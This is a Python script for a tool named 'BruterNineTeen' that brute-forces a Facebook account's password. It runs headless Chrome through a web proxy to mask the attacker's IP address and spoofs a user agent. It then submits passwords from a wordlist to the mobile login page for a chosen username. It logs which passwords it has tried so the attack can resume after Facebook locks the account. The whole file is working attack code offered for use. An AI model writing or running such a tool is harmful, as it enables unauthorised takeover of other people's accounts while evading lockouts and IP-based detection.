#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.chrome.service import Service
from clint.textui import colored
import subprocess
import time
import os
import optparse
founded_password=""
with open("Passwords/entered_passwords.txt","w") as f:
    f.write("BruterNineTeen Entered Passwords:\n----------------------------------\n")
with open("Passwords/not_entered_passwords.txt","w") as fil:
    fil.write("BruterNineTeen Not Entered Passwords:\n----------------------------------\n")
def fb_brute(username,password_wordlist):
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('disable-infobars')
    options.add_experimental_option('prefs', {'intl.accept_languages': 'en,en_US'})
    options.add_argument("user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36")
    loc=os.getcwd()
    serv=Service("%s/path/chromedriver"%loc)
    driver = webdriver.Chrome(options=options,service=serv)
    driver.get("https://www.proxysite.com")
    print(colored.red("[")+colored.green("+")+colored.red("]")+"Changing Your Ip Address For Security Purposes Please Wait.")
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div/main/div[1]/div/div[3]/form/div[2]/input"))).send_keys("https://ifconfig.me")
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div/main/div[1]/div/div[3]/form/div[2]/button"))).click()
    ip_adr=WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "html/body/div[5]/div[2]/table/tbody/tr[1]/td[2]/strong"))).text
    print(colored.red("-")*50)
    print(colored.red("[")+colored.green("+")+colored.red("]")+colored.green("Your Ip Address Has Been Changed To:")+colored.blue(str(ip_adr)))
    print(colored.red("[")+colored.magenta("!")+colored.red("]")+colored.yellow("Speed Of The Attack Depends On The Proxy Server.It Could Be Fast Or Slow."))

    u_agent=WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[5]/div[2]/table/tbody/tr[3]/td[2]"))).text
    print(colored.red("-")*50)
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div/div[2]/form/p[1]/input[1]"))).clear()
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div/div[2]/form/p[1]/input[1]"))).send_keys("https://m.facebook.com/login/?email=%s"%username)
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div/div[2]/form/p[1]/input[2]"))).click()
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[4]/div/div[3]/div[1]/div/div[2]/div[2]/form/div[5]/div[1]/button"))).click()
    for i in password_wordlist:
        try:
            WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="login_form"]/ul/li[2]/section/input'))).send_keys(i)
        except:
            try:
                WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[4]/div/div[3]/div/table/tbody/tr/td/div[2]/div[2]/form/ul/li[2]/section/input"))).send_keys(i)
            except:
                try:
                    iscorrect=WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[4]/div/div[3]/div[1]/span/div'))).text
                    print(colored.red("[-]Brute Force Can't Be Done. Because This Account Has Been Suspended By Facebook."))
                    print(colored.green("[+]But Don't Worry.You Will Be Able To Access This Account Later."))
                    print(colored.green("[+]This Error Is Not Because Of User Agent,Ip Address Or BruteNineTeen Program Algorithm.\n[+]Facebook Accessing To This Account Has Been Blocked By Faceb00k."))
                    break
                    exit()
                except:
                    pass 
        with open("Passwords/entered_passwords.txt","a+") as fi:
            fi.write("\n"+i)
        try:
            iscorrect=WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[4]/div/div[2]/div/table/tbody/tr/td/div[1]/div'))).text
            print(colored.red("[-]Password Is Not:")+colored.magenta(i))
            
        except:
            try:
                iscorrect=WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[4]/div/div[2]/div[1]/h2'))).text
                print(colored.red("[-]Brute Force Can't Be Done. Because This Account Has Been Suspended By Facebook."))
                print(colored.green("[!]But Don't Worry.You Will Be Able To Access This Account Later."))
                print(colored.green("[!]This Error Is Not Because Of User Agent,Ip Address Or BruteNineTeen Program Algorithm.\n[!]Accessing To This Account Has Been Blocked By Faceb00k."))
                print(colored.green("[!]BruterNineTeen Saved The Entered Passwords.Check The Passwords Folder.\n[!]You Will Be Able To Attack Later."))
                break
                exit()
            except:
                print(colored.green("[+]Password Found! -->")+colored.blue(i))
                break
                exit()
    for j in password_wordlist:
        with open("Passwords/entered_passwords.txt","r") as fenerbahce:
            same=fenerbahce.readlines()
        if not j in same:
            with open("Passwords/not_entered_passwords.txt","a+") as file:
                file.write(j)
